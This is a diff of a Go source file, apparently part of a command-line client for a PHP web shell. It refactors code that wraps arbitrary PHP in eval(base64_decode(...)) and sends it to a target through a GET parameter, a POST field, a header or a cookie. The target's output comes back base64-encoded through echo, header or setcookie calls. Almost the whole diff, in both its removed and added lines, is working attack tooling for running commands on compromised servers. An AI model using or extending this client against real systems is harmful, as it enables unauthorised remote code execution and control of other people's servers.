@@ -2,14 +2,15 @@ package network
 
 import (
 	"bytes"
-	"encoding/base64"
 	"fmt"
-	"io/ioutil"
 	"net/http"
 	"net/url"
+	"normalizer"
 
 	"github.com/urfave/cli"
 )
+
+type callback func(*http.Response)
 
 var NET = NETWORK{
 	host:      "http://localhost",
@@ -25,7 +26,6 @@ type config struct {
 	form   *bytes.Buffer
 	jar    []string
 	proxy  string
-	cmd    string
 }
 
 type NETWORK struct {
@@ -34,8 +34,8 @@ type NETWORK struct {
 	parameter string
 	crypt     bool
 	status    bool
+	cmd       string
 
-	_config       config
 	_body         url.Values
 	_lastResponse *http.Response
 }
@@ -67,105 +67,81 @@ func (n *NETWORK) Setup(c *cli.Context) {
 	n.status = true
 }
 
-func (n *NETWORK) _getHandleBack() string {
-	var r string
+func (n *NETWORK) Send(r string, f callback) {
+	var response *http.Response
+	response = nil
 
-	if n.method == 0 || n.method == 1 {
-		r = "echo(base64_encode($r));exit();"
-	} else if n.method == 2 {
-		r = "header('" + n.parameter + ":' . base64_encode($r));exit();"
-	} else if n.method == 3 {
-		r = "setcookie('" + n.parameter + "', base64_encode($r));exit();"
+	if n.method == 0 {
+		response = n.get(r)
 	}
 
-	return r
-}
-
-func (n *NETWORK) _encode(request *string) {
-	sEnc := base64.StdEncoding.EncodeToString([]byte(*request))
-	*request = "eval(base64_decode('" + sEnc + "'));"
-}
-
-func (n *NETWORK) _decode(response *string) {
-	sDec, err := base64.StdEncoding.DecodeString(*response)
-
-	if err != nil {
-		panic(err)
+	if n.method == 1 {
+		response = n.post(r)
 	}
 
-	*response = string(sDec)
-}
-
-func (n *NETWORK) _initConfig(r string) {
-	c := config{
-		url:    n.host,
-		method: "GET",
+	if n.method == 3 {
+		n.getWithHeader(r)
 	}
 
+	if n.method == 4 {
+		n.getWithCookie(r)
+	}
+
+	if response != nil && response.StatusCode < 400 {
+		f(response)
+	}
+}
+
+func (n *NETWORK) post(r string) *http.Response {
 	n.status = true
 
-	request := r + n._getHandleBack()
-	n._encode(&request)
+	request := n._getRequest(r)
+	n.cmd = request
 
-	if n.method == 0 { //GET
-		c.url = n.host + "?" + n.parameter + "=" + request
-	} else if n.method == 1 { //POST
-		c.method = "POST"
+	form := url.Values{}
+	form.Set(n.parameter, request)
+	n._body = form
 
-		form := url.Values{}
-		form.Set(n.parameter, request)
-		n._body = form
-		c.form = bytes.NewBufferString(form.Encode())
-	} else if n.method == 3 { //COOKIE
-		c.jar = []string{}
-	} else {
-		n.status = false
+	data := bytes.NewBufferString(form.Encode())
+
+	c := config{
+		url:    n.host,
+		method: "POST",
+		form:   data,
 	}
 
-	n._config = c
+	return n._send(&c)
 }
 
-func (n *NETWORK) _headerConfig(req *http.Request) {
-	if n.method == 1 {
-		req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
-	} else if n.method == 2 {
-		req.Header.Add(n.parameter, n._config.cmd)
-	}
-}
+func (n *NETWORK) get(r string) *http.Response {
+	n.status = true
 
-func (n *NETWORK) _handleSuccess(response *http.Response) {
-	n._lastResponse = response
+	request := n._getRequest(r)
+	n.cmd = request
 
-	defer response.Body.Close()
-	buffer, err := ioutil.ReadAll(response.Body)
+	url := n.host + "?" + n.parameter + "=" + request
 
-	if err != nil {
-		panic(err)
+	c := config{
+		url:    url,
+		method: "GET",
+		form:   nil,
 	}
 
-	body := string(buffer)
-	n._decode(&body)
-
-	fmt.Println(body)
+	return n._send(&c)
 }
 
-func (n *NETWORK) Send(r string) {
+func (n *NETWORK) getWithHeader(r string) {
+
+}
+
+func (n *NETWORK) getWithCookie(r string) {
+
+}
+
+func (n *NETWORK) _send(c *config) *http.Response {
 	client := &http.Client{}
-	n._initConfig(r)
 
-	if n.status == false {
-		err := new(error)
-		panic(err)
-	}
-
-	var req *http.Request
-	var err error
-
-	if n._config.form != nil {
-		req, err = http.NewRequest(n._config.method, n._config.url, n._config.form)
-	} else {
-		req, err = http.NewRequest(n._config.method, n._config.url, nil)
-	}
+	req, err := http.NewRequest(c.method, c.url, c.form)
 
 	if err != nil {
 		panic(err)
@@ -179,74 +155,33 @@ func (n *NETWORK) Send(r string) {
 		panic(err)
 	}
 
-	n._handleSuccess(resp)
+	n._lastResponse = resp
+
+	return resp
 }
 
-func (n *NETWORK) RequestInfo(c *cli.Context) {
-	if n._lastResponse == nil {
-		fmt.Println("You havn't made a request. You must make a request before seeing any information")
-		return
+func (n *NETWORK) _getRequest(r string) string {
+	var response string
+
+	if n.method == 0 || n.method == 1 {
+		response = "echo(" + normalizer.PHPEncode("$r") + ");exit();"
+	} else if n.method == 2 {
+		response = "header('" + n.parameter + ":' . " + normalizer.PHPEncode("$r") + ");exit();"
+	} else if n.method == 3 {
+		response = "setcookie('" + n.parameter + "', " + normalizer.PHPEncode("$r") + ");exit();"
 	}
 
-	request := n._lastResponse.Request
-	flag := false
-	request.PostForm = n._body
+	request := r + response
+	rEnc := normalizer.Encode(request)
+	final := "eval(" + normalizer.PHPDecode("'"+rEnc+"'") + ");"
 
-	if c.Bool("url") {
-		showRequestUrl(request)
-		flag = true
-	}
-
-	if c.Bool("method") {
-		showRequestMethod(request)
-		flag = true
-	}
-
-	if c.Bool("body") {
-		showRequestBody(request)
-		flag = true
-	}
-
-	if c.Bool("headers") {
-		showRequestHeaders(request)
-		flag = true
-	}
-
-	if !flag {
-		fmt.Println(request)
-	}
+	return final
 }
 
-func (n *NETWORK) ResponseInfo(c *cli.Context) {
-	if n._lastResponse == nil {
-		fmt.Println("You havn't made a request. You must make a request before seeing any information")
-		return
-	}
-
-	response := n._lastResponse
-	flag := false
-
-	if c.Bool("status") {
-		showResponseStatus(response)
-		flag = true
-	}
-
-	if c.Bool("body") {
-		showResponseBody(response)
-		flag = true
-	}
-
-	if c.Bool("headers") {
-		showResponseHeaders(response)
-		flag = true
-	}
-
-	if c.Bool("request") {
-		showResponseRequest(response)
-		flag = true
-	}
-
-	if !flag {
-		fmt.Println(response)
+func (n *NETWORK) _headerConfig(req *http.Request) {
+	if n.method == 1 {
+		req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
+	} else if n.method == 2 {
+		req.Header.Add(n.parameter, n.cmd)
 	}
 }
